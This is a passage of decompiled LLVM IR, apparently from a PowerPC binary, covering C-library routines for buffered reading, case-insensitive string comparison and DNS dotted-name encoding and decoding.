  br i1 %v3_10015814, label %dec_label_pc_1001581c, label %dec_label_pc_1001582c

dec_label_pc_1001581c:                            ; preds = %dec_label_pc_10015810
  %v1_1001581c = or i32 %v3_100157c4, 4
  store i32 %v1_1001581c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10015824 = trunc i32 %v1_1001581c to i16
  store i16 %v1_10015824, i16* %v1_100157c4, align 2
  br label %dec_label_pc_100158a4

dec_label_pc_1001582c:                            ; preds = %dec_label_pc_10015810
  %v1_1001582c = and i32 %v3_100157c4, 768
  store i32 %v1_1001582c, i32* %r0.global-to-local, align 4
  %v3_1001582c = icmp eq i32 %v1_1001582c, 0
  br i1 %v3_1001582c, label %dec_label_pc_10015840, label %dec_label_pc_10015834

dec_label_pc_10015834:                            ; preds = %dec_label_pc_1001582c
  store i32 ptrtoint (i32** @global_var_1002c8c8.1041 to i32), i32* %r3.global-to-local, align 4
  store i32 268523584, i32* @lr, align 4
  %v4_1001583c = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_1002c8c8.1041 to i16*), i32 %v3_100157f4)
  store i32 %v4_1001583c, i32* %r3.global-to-local, align 4
  %v0_10015840.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015840

dec_label_pc_10015840:                            ; preds = %dec_label_pc_1001582c, %dec_label_pc_10015834
  %v0_10015880 = phi i32 [ %v2_10015824, %dec_label_pc_1001582c ], [ %v0_10015840.pre, %dec_label_pc_10015834 ]
  %v1_10015840 = add i32 %v0_10015880, 8
  %v2_10015840 = inttoptr i32 %v1_10015840 to i32*
  %v3_10015840 = load i32, i32* %v2_10015840, align 4
  store i32 %v3_10015840, i32* %r9.global-to-local, align 4
  %v1_10015844 = add i32 %v0_10015880, 12
  %v2_10015844 = inttoptr i32 %v1_10015844 to i32*
  %v3_10015844 = load i32, i32* %v2_10015844, align 4
  store i32 %v3_10015844, i32* %r0.global-to-local, align 4
  %v4_10015848 = icmp eq i32 %v3_10015844, %v3_10015840
  br i1 %v4_10015848, label %dec_label_pc_10015880, label %dec_label_pc_10015850

dec_label_pc_10015850:                            ; preds = %dec_label_pc_10015840
  %v2_10015850 = add i32 %v0_10015880, 24
  %v3_10015850 = inttoptr i32 %v2_10015850 to i32*
  store i32 %v3_10015840, i32* %v3_10015850, align 4
  %v0_10015854 = load i32, i32* @r31, align 4
  store i32 %v0_10015854, i32* %r3.global-to-local, align 4
  store i32 268523612, i32* @lr, align 4
  %v3_10015858 = call i32 @__stdio_rfill(i32 %v0_10015854, i32 %v3_10015840)
  store i32 %v3_10015858, i32* %r3.global-to-local, align 4
  %v3_1001585c = icmp eq i32 %v3_10015858, 0
  br i1 %v3_1001585c, label %dec_label_pc_100158a0, label %dec_label_pc_10015864

dec_label_pc_10015864:                            ; preds = %dec_label_pc_10015850
  %v0_10015864 = load i32, i32* @r31, align 4
  %v1_10015864 = add i32 %v0_10015864, 20
  %v2_10015864 = inttoptr i32 %v1_10015864 to i32*
  %v3_10015864 = load i32, i32* %v2_10015864, align 4
  store i32 %v3_10015864, i32* %r0.global-to-local, align 4
  %v1_10015868 = add i32 %v0_10015864, 16
  %v2_10015868 = inttoptr i32 %v1_10015868 to i32*
  %v3_10015868 = load i32, i32* %v2_10015868, align 4
  store i32 %v3_10015868, i32* %r9.global-to-local, align 4
  %v2_1001586c = add i32 %v0_10015864, 24
  %v3_1001586c = inttoptr i32 %v2_1001586c to i32*
  store i32 %v3_10015864, i32* %v3_1001586c, align 4
  %v0_10015870 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015870 = add i32 %v0_10015870, 1
  store i32 %v1_10015870, i32* %r0.global-to-local, align 4
  %v1_10015874 = inttoptr i32 %v0_10015870 to i8*
  %v2_10015874 = load i8, i8* %v1_10015874, align 1
  %v3_10015874 = zext i8 %v2_10015874 to i32
  store i32 %v3_10015874, i32* %r3.global-to-local, align 4
  %v1_10015878.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015878

dec_label_pc_10015878:                            ; preds = %dec_label_pc_10015804, %dec_label_pc_10015864
  %v1_10015878 = phi i32 [ %v1_100158787, %dec_label_pc_10015804 ], [ %v1_10015878.pre, %dec_label_pc_10015864 ]
  %v0_10015878 = phi i32 [ %v1_10015808, %dec_label_pc_10015804 ], [ %v1_10015870, %dec_label_pc_10015864 ]
  %v2_10015878 = add i32 %v1_10015878, 16
  %v3_10015878 = inttoptr i32 %v2_10015878 to i32*
  store i32 %v0_10015878, i32* %v3_10015878, align 4
  br label %dec_label_pc_100158a4

dec_label_pc_10015880:                            ; preds = %dec_label_pc_10015840
  %v1_10015880 = inttoptr i32 %v0_10015880 to i16*
  store i32 %v0_10015880, i32* %r3.global-to-local, align 4
  %v2_10015884 = ptrtoint i8* %stack_var_-24 to i32
  store i32 268523664, i32* @lr, align 4
  %v5_1001588c = call i32 @__stdio_READ(i16* %v1_10015880, i32 %v2_10015884, i32 1)
  store i32 %v5_1001588c, i32* %r3.global-to-local, align 4
  %v3_10015890 = icmp eq i32 %v5_1001588c, 0
  br i1 %v3_10015890, label %dec_label_pc_100158a0, label %dec_label_pc_10015898

dec_label_pc_10015898:                            ; preds = %dec_label_pc_10015880
  %v3_10015898 = load i8, i8* %stack_var_-24, align 1
  %v4_10015898 = sext i8 %v3_10015898 to i32
  store i32 %v4_10015898, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100158a4

dec_label_pc_100158a0:                            ; preds = %dec_label_pc_100157b4, %dec_label_pc_10015880, %dec_label_pc_10015850
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100158a4

dec_label_pc_100158a4:                            ; preds = %dec_label_pc_10015898, %dec_label_pc_10015878, %dec_label_pc_1001581c, %dec_label_pc_100157d0, %dec_label_pc_100158a0
  store i32 %v0_10015780, i32* %r0.global-to-local, align 4
  store i32 %v0_10015788, i32* @r31, align 4
  %v0_100158b4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100158b4

; uselistorder directives
  uselistorder i32 %v0_10015880, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_10015804, { 1, 0 }
  uselistorder i32 %v3_100157f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100157d4, { 1, 0 }
  uselistorder i32 %v3_100157c4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v2_10015824, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_1002c8c8.1041 to i16*), { 1, 0 }
  uselistorder i16* @global_var_1002c598.1032, { 2, 1, 0, 3 }
  uselistorder i32 -2, { 10, 11, 12, 13, 2, 3, 5, 14, 15, 7, 1, 0, 16, 17, 18, 20, 21, 19, 22, 6, 8, 9, 4 }
  uselistorder i32 40, { 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 2, 1, 3 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 29, { 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14, 2, 3, 17, 18, 15, 16, 4 }
  uselistorder i32 128, { 6, 13, 14, 0, 1, 24, 25, 5, 4, 7, 8, 15, 16, 17, 18, 9, 19, 20, 21, 2, 11, 22, 23, 10, 3, 12 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_100158a4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_100158a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10015878, { 1, 0 }
  uselistorder label %dec_label_pc_10015840, { 1, 0 }
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_100158bc = load i32, i32* bitcast (i32** @global_var_1002c8dc.1064 to i32*), align 4
  %v0_100158c4.pre = load i32, i32* @r3, align 4
  %v1_100158c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100158c4

dec_label_pc_100158c4:                            ; preds = %dec_label_pc_100158ec, %entry
  %v0_100159006 = phi i32 [ %v0_100159007, %dec_label_pc_100158ec ], [ 0, %entry ]
  %v0_100158f0 = phi i32 [ %v1_100158f0, %dec_label_pc_100158ec ], [ %v1_100158c4.pre, %entry ]
  %v0_100158f4 = phi i32 [ %v1_100158f4, %dec_label_pc_100158ec ], [ %v0_100158c4.pre, %entry ]
  %v4_100158c4 = icmp eq i32 %v0_100158f4, %v0_100158f0
  %.pre = inttoptr i32 %v0_100158f4 to i8*
  br i1 %v4_100158c4, label %dec_label_pc_100158ec, label %dec_label_pc_100158cc

dec_label_pc_100158cc:                            ; preds = %dec_label_pc_100158c4
  %v2_100158cc = load i8, i8* %.pre, align 1
  %v3_100158cc = zext i8 %v2_100158cc to i32
  %v1_100158d0 = inttoptr i32 %v0_100158f0 to i8*
  %v2_100158d0 = load i8, i8* %v1_100158d0, align 1
  %v3_100158d0 = zext i8 %v2_100158d0 to i32
  %v1_100158d4 = mul nuw nsw i32 %v3_100158cc, 2
  %v1_100158d8 = mul nuw nsw i32 %v3_100158d0, 2
  %v2_100158dc = add i32 %v1_100158d4, %v3_100158bc
  %v3_100158dc = inttoptr i32 %v2_100158dc to i16*
  %v4_100158dc = load i16, i16* %v3_100158dc, align 2
  %v5_100158dc = sext i16 %v4_100158dc to i32
  %v2_100158e0 = add i32 %v1_100158d8, %v3_100158bc
  %v3_100158e0 = inttoptr i32 %v2_100158e0 to i16*
  %v4_100158e0 = load i16, i16* %v3_100158e0, align 2
  %v5_100158e0 = sext i16 %v4_100158e0 to i32
  %v2_100158e4 = sub nsw i32 %v5_100158dc, %v5_100158e0
  %v4_100158e8 = icmp eq i16 %v4_100158dc, %v4_100158e0
  br i1 %v4_100158e8, label %dec_label_pc_100158ec, label %dec_label_pc_10015900

dec_label_pc_100158ec:                            ; preds = %dec_label_pc_100158c4, %dec_label_pc_100158cc
  %v0_100159007 = phi i32 [ %v2_100158e4, %dec_label_pc_100158cc ], [ %v0_100159006, %dec_label_pc_100158c4 ]
  %v2_100158ec = load i8, i8* %.pre, align 1
  %v1_100158f0 = add i32 %v0_100158f0, 1
  %v1_100158f4 = add i32 %v0_100158f4, 1
  %v3_100158f8 = icmp eq i8 %v2_100158ec, 0
  br i1 %v3_100158f8, label %dec_label_pc_10015900, label %dec_label_pc_100158c4

dec_label_pc_10015900:                            ; preds = %dec_label_pc_100158ec, %dec_label_pc_100158cc
  %v0_10015900 = phi i32 [ %v0_100159007, %dec_label_pc_100158ec ], [ %v2_100158e4, %dec_label_pc_100158cc ]
  ret i32 %v0_10015900

; uselistorder directives
  uselistorder i32 %v2_100158e4, { 1, 0 }
  uselistorder i32 %v0_100158f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100158ec, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1001590c = load i32, i32* @lr, align 4
  store i32 %v0_1001590c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10015918 = load i32, i32* @r4, align 4
  store i32 %v0_10015918, i32* @r29, align 4
  %v0_1001591c = load i32, i32* @r5, align 4
  store i32 %v0_1001591c, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001598813 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1001598813, label %dec_label_pc_100159a4, label %dec_label_pc_10015998

dec_label_pc_1001592c:                            ; preds = %dec_label_pc_10015998
  store i32 268523824, i32* @lr, align 4
  %v3_1001592c = call i32 @__GI_strchr(i32 %v0_1001599814, i32 46)
  store i32 %v3_1001592c, i32* @r30, align 4
  %v3_10015930 = icmp eq i32 %v3_1001592c, 0
  %v0_10015934 = load i32, i32* @r31, align 4
  store i32 %v0_10015934, i32* @r3, align 4
  %v2_10015938 = sub i32 %v3_1001592c, %v0_10015934
  store i32 %v2_10015938, i32* %r0.global-to-local, align 4
  br i1 %v3_10015930, label %dec_label_pc_10015940, label %dec_label_pc_10015948

dec_label_pc_10015940:                            ; preds = %dec_label_pc_1001592c
  %v0_10015940 = call i32 @__GI_strlen()
  store i32 %v0_10015940, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_10015940, 16777216
  %v1_10015944 = sdiv i32 %sext, 16777216
  store i32 %v1_10015944, i32* %r0.global-to-local, align 4
  %v0_10015958.pre = load i32, i32* @r31, align 4
  %v0_10015968.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10015948

dec_label_pc_10015948:                            ; preds = %dec_label_pc_1001592c, %dec_label_pc_10015940
  %v0_10015968 = phi i32 [ %v3_1001592c, %dec_label_pc_1001592c ], [ %v0_10015968.pre, %dec_label_pc_10015940 ]
  %v0_10015958 = phi i32 [ %v0_10015934, %dec_label_pc_1001592c ], [ %v0_10015958.pre, %dec_label_pc_10015940 ]
  %v0_10015974 = phi i32 [ %v2_10015938, %dec_label_pc_1001592c ], [ %v1_10015944, %dec_label_pc_10015940 ]
  %v0_1001594c = load i32, i32* @r28, align 4
  %v1_1001594c = load i32, i32* %r27.global-to-local, align 4
  %v2_1001594c = sub i32 %v1_1001594c, %v0_1001594c
  %v1_10015950 = add i32 %v0_1001594c, 1
  store i32 %v1_10015950, i32* %r11.global-to-local, align 4
  %v1_10015954 = add i32 %v2_1001594c, -1
  store i32 %v0_10015958, i32* @r4, align 4
  %v0_1001595c = load i32, i32* @r29, align 4
  %v2_1001595c = add i32 %v0_1001595c, %v1_10015950
  store i32 %v2_1001595c, i32* @r3, align 4
  store i32 %v0_10015974, i32* @r5, align 4
  %v2_10015964 = icmp ult i32 %v0_10015974, %v1_10015954
  %v1_10015968 = add i32 %v0_10015968, 1
  store i32 %v1_10015968, i32* @r31, align 4
  %v3_10015948.not = icmp ne i32 %v0_10015974, 0
  %or.cond = and i1 %v2_10015964, %v3_10015948.not
  br i1 %or.cond, label %dec_label_pc_10015974, label %dec_label_pc_100159bc

dec_label_pc_10015974:                            ; preds = %dec_label_pc_10015948
  %v3_10015974 = trunc i32 %v0_10015974 to i8
  %v4_10015974 = add i32 %v0_1001595c, %v0_1001594c
  %v5_10015974 = inttoptr i32 %v4_10015974 to i8*
  store i8 %v3_10015974, i8* %v5_10015974, align 1
  %v0_10015978 = load i32, i32* %r11.global-to-local, align 4
  %v1_10015978 = load i32, i32* %r0.global-to-local, align 4
  %v2_10015978 = add i32 %v1_10015978, %v0_10015978
  store i32 %v2_10015978, i32* @r28, align 4
  store i32 268523904, i32* @lr, align 4
  %v0_1001597c = call i32 @memcpy()
  store i32 %v0_1001597c, i32* %r3.global-to-local, align 4
  %v0_10015980 = load i32, i32* @r30, align 4
  %v3_10015980 = icmp eq i32 %v0_10015980, 0
  br i1 %v3_10015980, label %dec_label_pc_100159a4, label %dec_label_pc_10015974.dec_label_pc_10015988_crit_edge

dec_label_pc_10015974.dec_label_pc_10015988_crit_edge: ; preds = %dec_label_pc_10015974
  %v0_10015988.pre = load i32, i32* @r31, align 4
  %v3_10015988 = icmp eq i32 %v0_10015988.pre, 0
  store i32 %v0_10015988.pre, i32* @r3, align 4
  br i1 %v3_10015988, label %dec_label_pc_100159a4, label %dec_label_pc_10015998

dec_label_pc_10015998:                            ; preds = %entry, %dec_label_pc_10015974.dec_label_pc_10015988_crit_edge
  %v0_1001599814 = phi i32 [ %v0_10015988.pre, %dec_label_pc_10015974.dec_label_pc_10015988_crit_edge ], [ %tmp, %entry ]
  %v1_10015998 = inttoptr i32 %v0_1001599814 to i8*
  %v2_10015998 = load i8, i8* %v1_10015998, align 1
  %v3_10015998 = zext i8 %v2_10015998 to i32
  store i32 %v3_10015998, i32* %r0.global-to-local, align 4
  %v3_1001599c = icmp eq i8 %v2_10015998, 0
  br i1 %v3_1001599c, label %dec_label_pc_100159a4, label %dec_label_pc_1001592c

dec_label_pc_100159a4:                            ; preds = %dec_label_pc_10015974.dec_label_pc_10015988_crit_edge, %dec_label_pc_10015974, %dec_label_pc_10015998, %entry
  %v0_100159a4 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_100159a4, 1
  br i1 %tmp10, label %dec_label_pc_100159bc, label %dec_label_pc_100159ac

dec_label_pc_100159ac:                            ; preds = %dec_label_pc_100159a4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100159b0 = load i32, i32* @r28, align 4
  %v1_100159b0 = add i32 %v0_100159b0, 1
  store i32 %v1_100159b0, i32* %r3.global-to-local, align 4
  %v1_100159b4 = load i32, i32* @r29, align 4
  %v4_100159b4 = add i32 %v1_100159b4, %v0_100159b0
  %v5_100159b4 = inttoptr i32 %v4_100159b4 to i8*
  store i8 0, i8* %v5_100159b4, align 1
  %v0_100159d0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100159c0

dec_label_pc_100159bc:                            ; preds = %dec_label_pc_10015948, %dec_label_pc_100159a4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100159c0

dec_label_pc_100159c0:                            ; preds = %dec_label_pc_100159ac, %dec_label_pc_100159bc
  %v0_100159d0 = phi i32 [ %v0_100159d0.pre, %dec_label_pc_100159ac ], [ -1, %dec_label_pc_100159bc ]
  store i32 %v0_1001590c, i32* %r0.global-to-local, align 4
  ret i32 %v0_100159d0

; uselistorder directives
  uselistorder i32 %v0_1001599814, { 1, 0 }
  uselistorder i32 %v0_10015988.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10015974, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10015944, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 12, 25, 24, 11, 1, 10, 9, 8, 26, 23, 22, 21, 19, 20, 18, 17, 16, 15, 14, 0, 13, 7, 5, 6, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 7, 6, 5, 15, 14, 13, 12, 11, 10, 9, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 46, { 0, 5, 3, 6, 7, 4, 1, 2 }
  uselistorder label %dec_label_pc_100159c0, { 1, 0 }
  uselistorder label %dec_label_pc_100159bc, { 1, 0 }
  uselistorder label %dec_label_pc_100159a4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10015998, { 1, 0 }
  uselistorder label %dec_label_pc_10015948, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_100159d8 = call i32 @__asm_mfcr()
  store i32 %v0_100159d8, i32* @r26, align 4
  %v3_100159e4 = icmp eq i32 %v0_100159d8, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_100159f4 = load i32, i32* @r6, align 4
  store i32 %v0_100159f4, i32* @r24, align 4
  br i1 %v3_100159e4, label %dec_label_pc_10015aac, label %dec_label_pc_100159fc

dec_label_pc_100159fc:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10015a8814 = load i32, i32* @r4, align 4
  %v2_10015a8815 = add i32 %v1_10015a8814, %v0_100159d8
  %v3_10015a8816 = inttoptr i32 %v2_10015a8815 to i8*
  %v4_10015a8817 = load i8, i8* %v3_10015a8816, align 1
  %v5_10015a8818 = zext i8 %v4_10015a8817 to i32
  store i32 %v5_10015a8818, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_10015a9020 = icmp eq i8 %v4_10015a8817, 0
  br i1 %v3_10015a9020, label %dec_label_pc_10015a9c, label %dec_label_pc_10015a0c

dec_label_pc_10015a0c:                            ; preds = %dec_label_pc_100159fc, %dec_label_pc_10015a84
  %v3_10015a8c22 = phi i1 [ %v3_10015a8c, %dec_label_pc_10015a84 ], [ false, %dec_label_pc_100159fc ]
  %v5_10015a8821 = phi i32 [ %v5_10015a88, %dec_label_pc_10015a84 ], [ %v5_10015a8818, %dec_label_pc_100159fc ]
  br i1 %v3_10015a8c22, label %dec_label_pc_10015a14, label %dec_label_pc_10015a10

dec_label_pc_10015a10:                            ; preds = %dec_label_pc_10015a0c
  %v0_10015a10 = load i32, i32* %r27.global-to-local, align 4
  %v1_10015a10 = add i32 %v0_10015a10, 1
  store i32 %v1_10015a10, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015a14

dec_label_pc_10015a14:                            ; preds = %dec_label_pc_10015a0c, %dec_label_pc_10015a10
  %v1_10015a14 = call i32 @__asm_rlwinm(i32 %v5_10015a8821, i32 0, i32 24, i32 25)
  %v0_10015a18 = load i32, i32* @r4, align 4
  %v1_10015a18 = add i32 %v0_10015a18, 1
  store i32 %v1_10015a18, i32* @r30, align 4
  %v3_10015a1c = icmp eq i32 %v1_10015a14, 192
  br i1 %v3_10015a1c, label %dec_label_pc_10015a24, label %dec_label_pc_10015a44

dec_label_pc_10015a24:                            ; preds = %dec_label_pc_10015a14
  %v0_10015a24 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015a24, label %dec_label_pc_10015a2c, label %dec_label_pc_10015a28

dec_label_pc_10015a28:                            ; preds = %dec_label_pc_10015a24
  %v0_10015a28 = load i32, i32* %r27.global-to-local, align 4
  %v1_10015a28 = add i32 %v0_10015a28, 1
  store i32 %v1_10015a28, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015a2c

dec_label_pc_10015a2c:                            ; preds = %dec_label_pc_10015a24, %dec_label_pc_10015a28
  %v0_10015a2c = load i32, i32* @r26, align 4
  %v2_10015a2c = add i32 %v0_10015a2c, %v1_10015a18
  %v3_10015a2c = inttoptr i32 %v2_10015a2c to i8*
  %v4_10015a2c = load i8, i8* %v3_10015a2c, align 1
  %v5_10015a2c = zext i8 %v4_10015a2c to i32
  %v1_10015a30 = call i32 @__asm_rlwinm(i32 %v5_10015a8821, i32 8, i32 18, i32 23)
  %v0_10015a34 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10015a34, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_10015a3c = or i32 %v5_10015a2c, %v1_10015a30
  store i32 %v2_10015a3c, i32* @r4, align 4
  br label %dec_label_pc_10015a84

dec_label_pc_10015a44:                            ; preds = %dec_label_pc_10015a14
  %v0_10015a44 = load i32, i32* %r11.global-to-local, align 4
  %v2_10015a44 = add i32 %v0_10015a44, %v5_10015a8821
  store i32 %v2_10015a44, i32* @r29, align 4
  %v1_10015a48 = add i32 %v2_10015a44, 1
  store i32 %v1_10015a48, i32* @r28, align 4
  %v1_10015a4c = load i32, i32* @r24, align 4
  %v2_10015a4c = icmp ult i32 %v1_10015a48, %v1_10015a4c
  br i1 %v2_10015a4c, label %dec_label_pc_10015a54, label %dec_label_pc_10015aac

dec_label_pc_10015a54:                            ; preds = %dec_label_pc_10015a44
  %v0_10015a54 = load i32, i32* @r26, align 4
  %v2_10015a54 = add i32 %v0_10015a54, %v1_10015a18
  store i32 %v2_10015a54, i32* @r4, align 4
  %v0_10015a58 = load i32, i32* @r25, align 4
  %v2_10015a58 = add i32 %v0_10015a58, %v0_10015a44
  store i32 %v2_10015a58, i32* @r3, align 4
  store i32 %v5_10015a8821, i32* @r5, align 4
  store i32 268524132, i32* @lr, align 4
  %v0_10015a60 = call i32 @memcpy()
  %v0_10015a64 = load i32, i32* @r30, align 4
  %v2_10015a64 = add i32 %v0_10015a64, %v5_10015a8821
  store i32 %v2_10015a64, i32* @r4, align 4
  %v0_10015a68 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10015a68, label %dec_label_pc_10015a70, label %dec_label_pc_10015a6c

dec_label_pc_10015a6c:                            ; preds = %dec_label_pc_10015a54
  %v0_10015a6c = load i32, i32* %r27.global-to-local, align 4
  %v2_10015a6c = add i32 %v0_10015a6c, %v5_10015a8821
  store i32 %v2_10015a6c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015a70

dec_label_pc_10015a70:                            ; preds = %dec_label_pc_10015a54, %dec_label_pc_10015a6c
  %v0_10015a70 = load i32, i32* @r26, align 4
  %v2_10015a70 = add i32 %v0_10015a70, %v2_10015a64
  %v3_10015a70 = inttoptr i32 %v2_10015a70 to i8*
  %v4_10015a70 = load i8, i8* %v3_10015a70, align 1
  %v3_10015a74 = icmp eq i8 %v4_10015a70, 0
  br i1 %v3_10015a74, label %dec_label_pc_10015a80, label %dec_label_pc_10015a7c

dec_label_pc_10015a7c:                            ; preds = %dec_label_pc_10015a70
  br label %dec_label_pc_10015a80

dec_label_pc_10015a80:                            ; preds = %dec_label_pc_10015a70, %dec_label_pc_10015a7c
  %v0_10015a80.off0 = phi i8 [ 0, %dec_label_pc_10015a70 ], [ 46, %dec_label_pc_10015a7c ]
  %v1_10015a80 = load i32, i32* @r25, align 4
  %v2_10015a80 = load i32, i32* @r29, align 4
  %v4_10015a80 = add i32 %v2_10015a80, %v1_10015a80
  %v5_10015a80 = inttoptr i32 %v4_10015a80 to i8*
  store i8 %v0_10015a80.off0, i8* %v5_10015a80, align 1
  %v0_10015a84.pre = load i32, i32* @r28, align 4
  %v0_10015a8c.pre.pre = load i32, i32* @r23, align 4
  %v1_10015a88.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10015a84

dec_label_pc_10015a84:                            ; preds = %dec_label_pc_10015a2c, %dec_label_pc_10015a80
  %v1_10015a88 = phi i32 [ %v2_10015a3c, %dec_label_pc_10015a2c ], [ %v1_10015a88.pre, %dec_label_pc_10015a80 ]
  %v0_10015a8c.pre = phi i32 [ 0, %dec_label_pc_10015a2c ], [ %v0_10015a8c.pre.pre, %dec_label_pc_10015a80 ]
  %v0_10015a84 = phi i32 [ %v0_10015a34, %dec_label_pc_10015a2c ], [ %v0_10015a84.pre, %dec_label_pc_10015a80 ]
  %v0_10015a88.pre = load i32, i32* @r26, align 4
  store i32 %v0_10015a84, i32* %r11.global-to-local, align 4
  %v2_10015a88 = add i32 %v1_10015a88, %v0_10015a88.pre
  %v3_10015a88 = inttoptr i32 %v2_10015a88 to i8*
  %v4_10015a88 = load i8, i8* %v3_10015a88, align 1
  %v5_10015a88 = zext i8 %v4_10015a88 to i32
  store i32 %v5_10015a88, i32* @r31, align 4
  %v3_10015a8c = icmp eq i32 %v0_10015a8c.pre, 0
  store i1 %v3_10015a8c, i1* %cr4_eq.global-to-local, align 1
  %v3_10015a90 = icmp eq i8 %v4_10015a88, 0
  br i1 %v3_10015a90, label %dec_label_pc_10015a98, label %dec_label_pc_10015a0c

dec_label_pc_10015a98:                            ; preds = %dec_label_pc_10015a84
  %v0_10015aa0.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10015a8c, label %dec_label_pc_10015aac, label %dec_label_pc_10015a9c

dec_label_pc_10015a9c:                            ; preds = %dec_label_pc_100159fc, %dec_label_pc_10015a98
  %v0_10015aa0.pre26 = phi i32 [ %v0_10015aa0.pre.pre, %dec_label_pc_10015a98 ], [ 0, %dec_label_pc_100159fc ]
  %v1_10015a9c = add i32 %v0_10015aa0.pre26, 1
  store i32 %v1_10015a9c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10015aac

dec_label_pc_10015aac:                            ; preds = %dec_label_pc_10015a44, %dec_label_pc_10015a98, %dec_label_pc_10015a9c, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_10015a9c, %dec_label_pc_10015a9c ], [ %v0_10015aa0.pre.pre, %dec_label_pc_10015a98 ], [ -1, %dec_label_pc_10015a44 ]
  %v1_10015abc = call %1 @__asm_mtcrf(i32 8, i32 %v0_100159d8)
  %v9_10015abc = extractvalue %1 %v1_10015abc, 7
  store i4 %v9_10015abc, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_10015aa0.pre.pre, { 1, 0 }
  uselistorder i1 %v3_10015a8c, { 0, 2, 1 }
  uselistorder i32 %v5_10015a88, { 1, 0 }
  uselistorder i32 %v5_10015a8821, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %v0_100159d8, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32 ()* @memcpy, { 17, 16, 15, 14, 13, 1, 0, 12, 11, 4, 24, 10, 9, 2, 5, 3, 8, 7, 6, 23, 22, 21, 20, 19, 18 }
